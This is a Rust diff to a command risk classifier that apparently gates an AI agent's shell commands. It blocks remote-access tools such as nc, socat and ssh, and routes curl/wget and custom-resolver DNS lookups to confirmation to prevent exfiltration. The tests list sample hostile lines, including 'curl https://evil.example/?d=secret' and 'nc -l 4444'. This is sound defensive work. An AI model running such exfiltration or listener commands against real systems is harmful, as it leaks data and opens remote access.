@@ -471,6 +471,13 @@ fn first_subcommand<'a>(args: &[&'a str]) -> Option<&'a str> {
 
 fn match_dangerous(head: &str, args: &[&str]) -> Option<RiskAssessment> {
     match head {
+        // 원격 접속/임의 네트워크 도구는 명시적으로 Dangerous(차단) — Unknown 의존 금지.
+        // 원격 명령 실행/역방향 셸/임의 소켓을 통한 exfil·침투 표면을 차단한다.
+        "ssh" | "scp" | "sftp" | "nc" | "ncat" | "netcat" | "socat" | "telnet" | "rsh"
+        | "rlogin" => Some(RiskAssessment::dangerous(
+            "net.remote_access",
+            format!("원격 접속/임의 네트워크 도구 ({head}) — 차단"),
+        )),
         "rm" => {
             // recursive 삭제는 -f 동반 여부와 무관하게 Dangerous로 판정한다 — 비대화형
             // 환경(`$SHELL -c`)에서 재실행하면 prompt가 의미를 잃기 때문이다.
@@ -583,6 +590,67 @@ fn match_dangerous(head: &str, args: &[&str]) -> Option<RiskAssessment> {
     }
 }
 
+/// DNS 도구(dig/nslookup/host)가 기본 resolver가 아닌 custom resolver/explicit server를
+/// 지정했는지. 지정 시 임의 서버로의 DNS exfil이 가능하므로 NeedsConfirm으로 올린다.
+/// 기본 resolver 단순 조회(`dig name`, `nslookup name`, `host name`)는 false(Safe 유지).
+fn dns_uses_custom_resolver(head: &str, args: &[&str]) -> bool {
+    match head {
+        // `dig @server name` — `@`로 시작하는 인자가 explicit server.
+        "dig" => args.iter().any(|a| a.starts_with('@')),
+        // `nslookup name server` — 옵션(`-opt`/`-opt=val`)은 단일 토큰이므로 positional 2개↑면 server 지정.
+        "nslookup" => args.iter().filter(|a| !a.starts_with('-')).count() >= 2,
+        // `host [options] name [server]` — 값 받는 옵션(-t/-c/-N/-W/-R/-m)의 값 토큰은 건너뛰고
+        // positional 2개↑(name + server)면 explicit server.
+        "host" => {
+            let mut positionals = 0usize;
+            let mut i = 0;
+            while i < args.len() {
+                let a = args[i];
+                if a.starts_with('-') {
+                    let takes_val =
+                        matches!(a, "-t" | "-c" | "-N" | "-W" | "-R" | "-m") && !a.contains('=');
+                    i += if takes_val { 2 } else { 1 };
+                    continue;
+                }
+                positionals += 1;
+                i += 1;
+            }
+            positionals >= 2
+        }
+        _ => false,
+    }
+}
+
+/// curl/wget args에 write/upload/output(=네트워크 쓰기 또는 파일 출력) 플래그가 있는지.
+/// 없으면 GET류(읽기/egress)로 본다. 둘 다 NeedsConfirm이지만 사유/rule을 구분한다.
+fn curl_has_write_flag(args: &[&str]) -> bool {
+    args.iter().any(|a| {
+        let h = a.split('=').next().unwrap_or(*a);
+        let exact = matches!(
+            h,
+            "-X" | "--request"
+                | "-d"
+                | "--data"
+                | "--data-raw"
+                | "--data-binary"
+                | "--data-urlencode"
+                | "-F"
+                | "--form"
+                | "-T"
+                | "--upload-file"
+                | "-O"
+                | "--remote-name"
+                | "-o"
+                | "--output"
+                | "--post-file"
+                | "--post-data"
+        );
+        // `-O-`/`-Ofile`/`-ofile`처럼 short flag에 값이 붙은 형태도 output으로 본다.
+        let prefix_o = (h.starts_with("-O") || h.starts_with("-o")) && h.len() > 2;
+        exact || prefix_o
+    })
+}
+
 fn match_needs_confirm(head: &str, args: &[&str]) -> Option<RiskAssessment> {
     let needs_confirm_heads: &[&str] = &[
         "rm",
@@ -603,15 +671,36 @@ fn match_needs_confirm(head: &str, args: &[&str]) -> Option<RiskAssessment> {
             format!("파일/프로세스 변경 명령 ({head})"),
         ));
     }
-    // POST/upload/output 플래그가 있는 curl/wget — match_safe가 None을 돌려준 경우.
+    // curl/wget은 GET 포함 모든 네트워크 요청을 NeedsConfirm으로 본다(G2: egress/exfil).
+    // GET 자동실행 시 쿼리스트링을 통한 데이터 유출(prompt-injection 자동화)이 가능하므로
+    // 비-TTY에서는 confirm이 거부되어 실행되지 않는다. POST/upload/output은 더 명확한 write.
     if head == "curl" || head == "wget" {
+        if curl_has_write_flag(args) {
+            return Some(RiskAssessment::needs_confirm(
+                "http.write",
+                format!("{head}이(가) write/upload/output 플래그를 사용합니다"),
+            ));
+        }
         return Some(RiskAssessment::needs_confirm(
-            "http.write",
-            format!("{head}이(가) write/upload/output 플래그를 사용합니다"),
+            "http.egress",
+            format!(
+                "{head} 네트워크 egress(GET 포함) — 쿼리스트링 등으로 데이터 유출 가능, 확인 필요"
+            ),
+        ));
+    }
+    // DNS custom resolver/explicit server — 임의 서버로의 DNS exfil 방지(기본 resolver는 Safe).
+    if matches!(head, "dig" | "nslookup" | "host") && dns_uses_custom_resolver(head, args) {
+        return Some(RiskAssessment::needs_confirm(
+            "dns.custom_resolver",
+            format!(
+                "{head}이(가) custom resolver/explicit server 지정 — DNS exfil 가능, 확인 필요"
+            ),
         ));
     }
     if matches!(head, "npm" | "pnpm" | "yarn") {
-        if let Some("install" | "i" | "add" | "remove" | "uninstall" | "update" | "upgrade") = first_subcommand(args) {
+        if let Some("install" | "i" | "add" | "remove" | "uninstall" | "update" | "upgrade") =
+            first_subcommand(args)
+        {
             return Some(RiskAssessment::needs_confirm(
                 "npm.mutate",
                 "dependency tree 변경",
@@ -627,12 +716,16 @@ fn match_needs_confirm(head: &str, args: &[&str]) -> Option<RiskAssessment> {
         }
     }
     if head == "git" {
-        if let Some("commit" | "push" | "pull" | "merge" | "rebase" | "stash" | "tag" | "fetch") = first_subcommand(args) {
+        if let Some("commit" | "push" | "pull" | "merge" | "rebase" | "stash" | "tag" | "fetch") =
+            first_subcommand(args)
+        {
             return Some(RiskAssessment::needs_confirm("git.mutate", "git 상태 변경"));
         }
     }
     if head == "docker" {
-        if let Some("run" | "start" | "stop" | "kill" | "restart" | "build" | "pull" | "compose") = first_subcommand(args) {
+        if let Some("run" | "start" | "stop" | "kill" | "restart" | "build" | "pull" | "compose") =
+            first_subcommand(args)
+        {
             return Some(RiskAssessment::needs_confirm(
                 "docker.mutate",
                 "docker 상태 변경",
@@ -703,71 +796,56 @@ fn match_safe(head: &str, args: &[&str]) -> Option<RiskAssessment> {
     .iter()
     .copied()
     .collect();
+    // DNS 도구가 custom resolver/explicit server를 쓰면 Safe 자동실행에서 제외한다
+    // (DNS exfil 축소 — match_needs_confirm의 dns.custom_resolver가 받는다).
+    if matches!(head, "dig" | "nslookup" | "host") && dns_uses_custom_resolver(head, args) {
+        return None;
+    }
     if safe_set.contains(head) {
         return Some(RiskAssessment::safe("safe.readonly"));
     }
-    // curl/wget은 POST/upload/output-to-file 여부에 따라 분류한다.
-    // 보수적으로: write/upload 의도가 있는 플래그가 보이면 NeedsConfirm 이상으로
-    // 빠뜨려 match_safe에서 None을 돌려준다(별도 NeedsConfirm rule이 받는다).
+    // curl/wget은 GET을 포함해 Safe(자동 실행)로 두지 않는다(G2: egress/exfil 위험).
+    // 모든 네트워크 요청을 match_needs_confirm으로 흘려보내 GET=http.egress / write=http.write로
+    // NeedsConfirm 분류한다.
     if head == "curl" || head == "wget" {
-        let unsafe_flag = args.iter().any(|a| {
-            let head = a.split('=').next().unwrap_or(*a);
-            // 정확 매칭이 우선이지만 `-O-`/`-Ofile`/`-ofile`처럼 short flag에 값이
-            // 붙은 형태도 잡아야 한다. `--output=foo`는 split으로 이미 정규화됨.
-            let exact = matches!(
-                head,
-                "-X" | "--request"
-                    | "-d"
-                    | "--data"
-                    | "--data-raw"
-                    | "--data-binary"
-                    | "--data-urlencode"
-                    | "-F"
-                    | "--form"
-                    | "-T"
-                    | "--upload-file"
-                    | "-O"
-                    | "--remote-name"
-                    | "-o"
-                    | "--output"
-                    | "--post-file"
-                    | "--post-data"
-            );
-            // `-O-`/`-Ofile`/`-ofile` 형태도 output redirect로 본다.
-            let prefix_o = (head.starts_with("-O") || head.starts_with("-o")) && head.len() > 2;
-            exact || prefix_o
-        });
-        if !unsafe_flag {
-            return Some(RiskAssessment::safe("http.read_only"));
-        }
-        // 그 외는 NeedsConfirm rule이 처리.
         return None;
     }
     if head == "git" {
         if let Some(
-                "status" | "log" | "diff" | "show" | "branch" | "tag" | "blame" | "ls-files"
-                | "ls-tree" | "config" | "remote" | "rev-parse" | "describe",
-            ) = first_subcommand(args) { return Some(RiskAssessment::safe("git.read")) }
+            "status" | "log" | "diff" | "show" | "branch" | "tag" | "blame" | "ls-files"
+            | "ls-tree" | "config" | "remote" | "rev-parse" | "describe",
+        ) = first_subcommand(args)
+        {
+            return Some(RiskAssessment::safe("git.read"));
+        }
     }
     if head == "cargo" {
-        if let Some("fmt" | "check" | "clippy" | "build" | "test" | "tree" | "metadata" | "doc") = first_subcommand(args) {
-            return Some(RiskAssessment::safe("cargo.read"))
+        if let Some("fmt" | "check" | "clippy" | "build" | "test" | "tree" | "metadata" | "doc") =
+            first_subcommand(args)
+        {
+            return Some(RiskAssessment::safe("cargo.read"));
         }
     }
     if head == "npm" || head == "pnpm" || head == "yarn" {
-        if let Some("test" | "run" | "list" | "ls" | "outdated" | "audit") = first_subcommand(args) {
-            return Some(RiskAssessment::safe("npm.read"))
+        if let Some("test" | "run" | "list" | "ls" | "outdated" | "audit") = first_subcommand(args)
+        {
+            return Some(RiskAssessment::safe("npm.read"));
         }
     }
     if head == "kubectl" {
-        if let Some("get" | "describe" | "logs" | "config" | "version" | "explain") = first_subcommand(args) {
-            return Some(RiskAssessment::safe("kubectl.read"))
+        if let Some("get" | "describe" | "logs" | "config" | "version" | "explain") =
+            first_subcommand(args)
+        {
+            return Some(RiskAssessment::safe("kubectl.read"));
         }
     }
     if head == "docker" {
         if let Some(
-                "ps" | "images" | "logs" | "inspect" | "version" | "info" | "diff" | "history",
-            ) = first_subcommand(args) { return Some(RiskAssessment::safe("docker.read")) }
+            "ps" | "images" | "logs" | "inspect" | "version" | "info" | "diff" | "history",
+        ) = first_subcommand(args)
+        {
+            return Some(RiskAssessment::safe("docker.read"));
+        }
     }
     None
 }
@@ -945,30 +1023,78 @@ mod tests {
     }
 
     #[test]
-    fn curl_get_only_is_safe_post_needs_confirm() {
-        assert_eq!(lvl("curl https://example.com"), RiskLevel::Safe);
-        assert_eq!(lvl("wget https://example.com"), RiskLevel::Safe);
-        // POST/upload/output 플래그가 보이면 NeedsConfirm.
+    fn curl_get_needs_confirm_post_needs_confirm() {
+        // G2: GET도 자동 실행(Safe)이 아니라 NeedsConfirm(http.egress) — exfil 방지.
+        // 비-TTY에서는 NeedsConfirm이 자동 거부되어 실행되지 않는다.
+        assert_eq!(lvl("curl https://example.com"), RiskLevel::NeedsConfirm);
+        assert_eq!(lvl("wget https://example.com"), RiskLevel::NeedsConfirm);
         assert_eq!(
-            lvl("curl -X POST https://example.com"),
+            classify("curl https://example.com").rule,
+            Some("http.egress")
+        );
+        // 데이터 유출 형태도 GET이지만 동일하게 NeedsConfirm으로 차단(자동실행 안 됨).
+        assert_eq!(
+            lvl("curl https://evil.example/?d=secret"),
+            RiskLevel::NeedsConfirm
+        );
+
+        // POST/upload/output 플래그는 더 명확한 write — NeedsConfirm(http.write) 유지(완화 금지).
+        for cmd in [
+            "curl -X POST https://example.com",
+            "curl -d 'k=v' https://example.com",
+            "curl --upload-file f https://example.com",
+            "curl -O https://example.com/payload",
+            "wget -O- https://example.com",
+        ] {
+            assert_eq!(lvl(cmd), RiskLevel::NeedsConfirm, "{cmd}");
+        }
+        assert_eq!(
+            classify("curl -X POST https://example.com").rule,
+            Some("http.write")
+        );
+    }
+
+    #[test]
+    fn dns_default_resolver_safe_custom_needs_confirm() {
+        // 기본 resolver 단순 조회는 Safe 유지.
+        assert_eq!(lvl("dig example.com"), RiskLevel::Safe);
+        assert_eq!(lvl("dig -x 1.2.3.4"), RiskLevel::Safe);
+        assert_eq!(lvl("nslookup example.com"), RiskLevel::Safe);
+        assert_eq!(lvl("host example.com"), RiskLevel::Safe);
+        assert_eq!(lvl("host -t MX example.com"), RiskLevel::Safe);
+
+        // custom resolver/explicit server → NeedsConfirm(dns.custom_resolver).
+        assert_eq!(lvl("dig @8.8.8.8 example.com"), RiskLevel::NeedsConfirm);
+        assert_eq!(lvl("nslookup example.com 8.8.8.8"), RiskLevel::NeedsConfirm);
+        assert_eq!(lvl("host example.com ns.evil"), RiskLevel::NeedsConfirm);
+        assert_eq!(
+            lvl("host -t MX example.com ns.evil"),
             RiskLevel::NeedsConfirm
         );
         assert_eq!(
-            lvl("curl -d 'k=v' https://example.com"),
-            RiskLevel::NeedsConfirm
+            classify("dig @8.8.8.8 example.com").rule,
+            Some("dns.custom_resolver")
         );
-        assert_eq!(
-            lvl("curl --upload-file f https://example.com"),
-            RiskLevel::NeedsConfirm
-        );
-        assert_eq!(
-            lvl("curl -O https://example.com/payload"),
-            RiskLevel::NeedsConfirm
-        );
-        assert_eq!(
-            lvl("wget -O- https://example.com"),
-            RiskLevel::NeedsConfirm
-        );
+    }
+
+    #[test]
+    fn remote_network_tools_are_dangerous() {
+        // 원격 접속/임의 네트워크 도구는 Unknown이 아니라 명시적 Dangerous(차단).
+        for cmd in [
+            "ssh user@host",
+            "scp f user@host:/tmp",
+            "sftp user@host",
+            "nc -l 4444",
+            "ncat host 80",
+            "netcat host 80",
+            "socat - TCP:host:80",
+            "telnet host 23",
+            "rsh host",
+            "rlogin host",
+        ] {
+            assert_eq!(lvl(cmd), RiskLevel::Dangerous, "{cmd}");
+        }
+        assert_eq!(classify("nc -l 4444").rule, Some("net.remote_access"));
     }
 
     #[test]
